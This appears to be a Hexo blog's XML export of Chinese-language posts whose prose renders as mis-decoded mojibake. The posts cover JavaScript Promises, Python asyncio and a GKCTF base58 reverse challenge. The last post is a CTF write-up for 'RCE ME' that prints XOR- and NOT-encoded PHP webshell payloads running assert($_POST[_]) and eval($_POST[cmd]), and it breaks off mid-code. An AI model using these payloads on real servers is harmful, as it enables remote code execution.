title="å¿ƒå¾—ç§¯ç´¯"></a>å¿ƒå¾—ç§¯ç´¯</h2><p>å¤šè®¾è®¾é¡µé¢çŠ¶æ€ï¼Œä»¥ä¾¿æŸ¥çœ‹å¼‚æ­¥ä¸‹çš„é¡µé¢æƒ…å†µ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>pageStatus<span class="token operator">:</span> <span class="token string">'loading'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>pageStatus<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><p>å¹¶éæ˜¯è¿è´¯æ€§çš„æ‰§è¡Œå®Œp2æ‰§è¡Œthenä¹‹åå†æ‰§è¡Œcatch<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210514211546192_20868.png"><br>è€Œæ˜¯è§¦å‘äº†<code>resolve()</code>,çŠ¶æ€å˜æˆ<code>resolve</code>,æ‰å…è®¸æ‰§è¡Œ<br>è€Œä¸”æ˜¯ç­‰ç€ä¸€å±‚(åŒæ­¥)æ‰§è¡Œå®Œï¼Œå†æ‰§è¡Œthenã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Promise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"resolved."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hi!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Promise</span><span class="token comment">// Hi!</span><span class="token comment">// resolved.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Promise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"resolved."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hi!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Promise</span><span class="token comment">// Hi!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code </tag>
            
            <tag> å¾®ä¿¡å°ç¨‹åº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼‚æ­¥Asyncioå­¦ä¹ ç¬”è®°</title>
      <link href="/p/574792763.html"/>
      <url>/p/574792763.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœŸå°±ä¸€å¹´å‘ä¸€ç¯‡ã€‚è¿™ä¸€å¹´å‘ç”Ÿäº†å¥½å¤šäº‹ï¼ŒæŠŠæˆ‘æ‰“å¾—æ‰‹å¿™è„šä¹±ï¼ŒçŸ­çŸ­ä¸€å¹´ï¼Œç‰©æ˜¯äººéã€‚</p><p>æ˜¨å¤©å†™awdç›¸å…³è„šæœ¬ï¼Œæƒ³ç€æ¥ç‚¹ç‹ çš„ï¼ŒåŠ é€Ÿæ··æ·†æµé‡å‘åŒ…ï¼Œè¯•è¯•å¼‚æ­¥ã€‚æ­£å¥½çœ‹åˆ°githubä¸Šæœ‰ç›¸å…³æºç ï¼Œrequests+asyncioã€‚</p><p>æƒ³ç€requestsæ˜¯é˜»å¡çš„æ€ä¹ˆèƒ½ç”¨å¼‚æ­¥å‘¢ï¼ŸæŠ˜è…¾äº†å¥½ä¹…ï¼Œçœ‹ç€12345é¡ºåºå‘åŒ…ï¼Œè¿™<del>ä»–å¨˜</del>ä¸å°±æ˜¯åŒæ­¥å‘é€å—ï¼ï¼</p><p>å¾—ï¼Œéƒ½èŠ±é‚£ä¹ˆé•¿æ—¶é—´äº†ï¼Œæ¥éƒ½æ¥äº†ã€‚åˆå¼€å§‹ç ”ç©¶å¼‚æ­¥åŸç†ï¼Œå°è¯•httpx+asyncioã€‚æŠ˜è…¾å¥½ä¹…ï¼Œå¤±è´¥äº†ã€‚</p><p>ç¿»æ–‡æ¡£è§†é¢‘æ•™ç¨‹åˆ°11ç‚¹ï¼Œæœ€åå‘ç°ï¼Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">with</span> httpx<span class="token punctuation">.</span>AsyncClient<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>httpx.AsyncClient</code>åé¢çš„å°æ‹¬å·æ²¡åŠ ï¼Œtryæ•æ‰åˆ°çš„æŠ¥é”™åˆè¢«æˆ‘passäº†</p><p><img src="https://i.loli.net/2021/07/02/yr7PaN1YJgzxwbE.jpg"></p><p>æ— è¯­ï¼Œå§‘ä¸”æŠŠä¸­é—´åšçš„ç¬”è®°è®°ä¸€ä¸‹å§ã€‚</p><h2 id="ç¬”è®°"><a href="#ç¬”è®°" class="headerlink" title="ç¬”è®°"></a>ç¬”è®°</h2><p>await åé¢åªèƒ½è·Ÿï¼šåç¨‹å¯¹è±¡ï¼Œtaskå¯¹è±¡ï¼Œfutureå¯¹è±¡<br>awaitæ„ä¹‰ï¼šç­‰å¾…ä¸€ä¸ªå‡½æ•°ç»“æŸï¼Œåœ¨ç­‰å¾…çš„è¿‡ç¨‹ä¸­åˆ‡æ¢åˆ°å…¶ä»–å‡½æ•°æ‰§è¡Œä»¥å…æµªè´¹æ—¶é—´ã€‚ä»¥æ­¤å®ç°å¹¶å‘ã€‚<br>python&gt;=3.7ä¹‹åï¼Œå»ºè®®ç”¨<code>asyncio.create_task()</code>åˆ›å»ºtaskå¯¹è±¡</p><h3 id="æ³¨é‡Šäº‹é¡¹"><a href="#æ³¨é‡Šäº‹é¡¹" class="headerlink" title="æ³¨é‡Šäº‹é¡¹"></a>æ³¨é‡Šäº‹é¡¹</h3><ul><li><p>ç›´æ¥<code>await task</code>ä¸ä¼šå¯¹å¹¶å‘æœ‰å¸®åŠ©</p><p>é”™è¯¯ç”¨æ³•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ­£ç¡®ç”¨æ³•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    task1 <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    task2 <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> task1    <span class="token keyword">await</span> task2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Python3.7ä¹‹åæ–°å¢æ¥å£</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸¤è€…ç­‰ä»·</p><h3 id="å®ç”¨èŒƒä¾‹"><a href="#å®ç”¨èŒƒä¾‹" class="headerlink" title="å®ç”¨èŒƒä¾‹"></a>å®ç”¨èŒƒä¾‹</h3><ul><li>èŒƒä¾‹1 åœ¨åç¨‹å‡½æ•°å†…éƒ¨åˆ›å»ºtaskså¹¶ç»„åˆ</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tasks<span class="token operator">=</span><span class="token punctuation">[</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>func2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    done<span class="token punctuation">,</span>pending <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>èŒƒä¾‹2 åœ¨å¤–é¢æŠŠåç¨‹å‡½æ•°ç»„åˆæˆtasks</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">await</span> asnycio<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>tasks<span class="token operator">=</span><span class="token punctuation">[</span>func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="asyncia-éå¼‚æ­¥å‡½æ•°æ­é…"><a href="#asyncia-éå¼‚æ­¥å‡½æ•°æ­é…" class="headerlink" title="asyncia+éå¼‚æ­¥å‡½æ•°æ­é…"></a>asyncia+éå¼‚æ­¥å‡½æ•°æ­é…</h3><p>requestsé»˜è®¤ä¸æ”¯æŒå¼‚æ­¥ï¼Œä½†å¯ä»¥é€šè¿‡çº¿ç¨‹æ± é…åˆå®ç°ã€‚ä½†è€—è´¹èµ„æºè¾ƒå¤š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_request</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">,</span> url<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token keyword">await</span> futuretasks <span class="token operator">=</span> <span class="token punctuation">[</span>_request<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> url_list<span class="token punctuation">]</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="uvloopï¼Œæ€§èƒ½æå‡ï¼"><a href="#uvloopï¼Œæ€§èƒ½æå‡ï¼" class="headerlink" title="uvloopï¼Œæ€§èƒ½æå‡ï¼"></a>uvloopï¼Œæ€§èƒ½æå‡ï¼</h3><p>ç”¨uvloopä»£æ›¿asyncioé»˜è®¤çš„äº‹ä»¶å¾ªç¯ä»¥æå‡2å€ä»¥ä¸Šæ€§èƒ½ã€‚</p><pre class="line-numbers language-none"><code class="language-none">import asyncioimport uvloopasyncio.set_event_loop_policy(uvloop.EventLoopPolicy())# åç»­ä»£ç ä¸asyncioä»£ç ä¸€è‡´ï¼Œå†…éƒ¨äº‹ä»¶å¾ªç¯ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºuvloop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>pythonæ¨¡å—uvloopæš‚ä¸æ”¯æŒwindowså’Œpython3.9</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Asyncio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[2021GKCTF]QQQQT</title>
      <link href="/p/2157961736.html"/>
      <url>/p/2157961736.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®è¯:[base58|åŠ å¯†ç®—æ³•é¢˜|å¯†ç å­¦|å¸¸è§åŠ å¯†]</p><p>å½“æ—¶æ²¡åšå‡ºæ¥ï¼Œè´´è´´wpé‡Œçš„å†…å®¹</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224317385.png" alt="image-20210719224317385"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224320436.png" alt="image-20210719224320436"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224323676.png" alt="image-20210719224323676"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-2021GKCTF-QQQQT/image-20210719224329109.png" alt="image-20210719224329109"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">def</span> <span class="token function">b58encode</span><span class="token punctuation">(</span>tmp<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    base58 <span class="token operator">=</span> <span class="token string">"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> temp <span class="token operator">*</span> <span class="token number">256</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    tmp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        tmp<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> temp <span class="token operator">%</span> <span class="token number">58</span><span class="token punctuation">)</span>        temp <span class="token operator">=</span> temp <span class="token operator">//</span> <span class="token number">58</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    temp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        temp <span class="token operator">+=</span> base58<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> temp<span class="token keyword">def</span> <span class="token function">b58decode</span><span class="token punctuation">(</span>tmp<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    base58 <span class="token operator">=</span> <span class="token string">"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"</span>    temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>base58<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> tmp <span class="token operator">*</span> <span class="token number">58</span> <span class="token operator">+</span> temp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment"># unhexlify()=a2b_hex()ï¼Œå°†16è¿›åˆ¶æ•°è½¬åŒ–ä¸ºç›¸åº”asciiç å­—ç¬¦ä¸²</span>    <span class="token keyword">return</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token builtin">cmp</span> <span class="token operator">=</span> <span class="token string">"56fkoP8KhwCf3v7CEz"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> b58decode<span class="token punctuation">(</span><span class="token builtin">cmp</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> å¸¸è§åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</title>
      <link href="/p/3316915752.html"/>
      <url>/p/3316915752.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[æ— å­—æ¯æ•°å­—shell|ld_preload|disable_function]</p><p>ä»¥å‰åšçš„é¢˜ï¼Œç°åœ¨å†çœ‹ä¹‹å‰å†™çš„è®°å½•ï¼Œå¤ªé€—ä¹äº†ï¼Œå½“æ—¶æ€ä¹ˆé‚£ä¹ˆå¤šè¿·æƒ‘æ“ä½œå‘¢</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸€å¼€å§‹æ˜¯æƒ³ç€æ— å‚webshellï¼Œè¿˜å†™äº†å¥½ä¹…çš„fuzzä»£ç <br>å¾— æ²¡ç”¨ï¼Œä»£ç å†™çš„ä¹Ÿä¸å¥½ã€‚<br>æœç„¶èŠ±ä¸ªåŠä¸ªå¤šå°æ—¶åšä¸å‡ºå°±ç›´æ¥çœ‹WP<br>æµªè´¹äº†ä¸‰ä¸ªå°æ—¶ï¼Œç¦»è°±</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%01'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%13'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%05'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%12'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%14'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_='assert';</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0D'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%2F'</span><span class="token operator">^</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%0E'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%09'</span><span class="token operator">^</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $__='_POST';</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// assert($_POST[_]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯æœ€ä½é™åº¦äº†ï¼Œéœ€è¦å…ˆæŠŠPOSTè¿™å‡ ä¸ªå­—ç¬¦æ‹¼æ¥å¥½</p><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;$&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);assert($$[_]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME/image-20210720195913492.png" alt="image-20210720195913492"></p><p>æœ€ä½é™åº¦éƒ½å¾—äº”å…­åï¼Œè¿™40é•¿åº¦è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚å½“æ—¶æƒ³åˆ°è¿™å°±è¯¥æ˜ç™½äº†<br>å¯æƒœä¸€ç›´æ²¡è§‰æ‚Ÿï¼Œæµªè´¹åŠå¤©æ—¶é—´ã€‚</p><p>2021å¹´7æœˆ20æ—¥20:12:48 è¿™å¹¶éæœ€ç®€ï¼Œå…·ä½“å¯çœ‹<a href="https://syunaht.com/p/745812677.html#toc-heading-4">https://syunaht.com/p/745812677.html#toc-heading-4</a></p><p>è¿™é¢˜è¿˜æ˜¯å¾—URLç¼–ç å–åç»•è¿‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'(eval($_POST[cmd]))'</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'(~'</span> <span class="token operator">.</span> <span class="token variable">$b</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')(~'</span> <span class="token operator">.</span> <span class="token variable">$d</span> <span class="token operator">.</span> <span class="token string 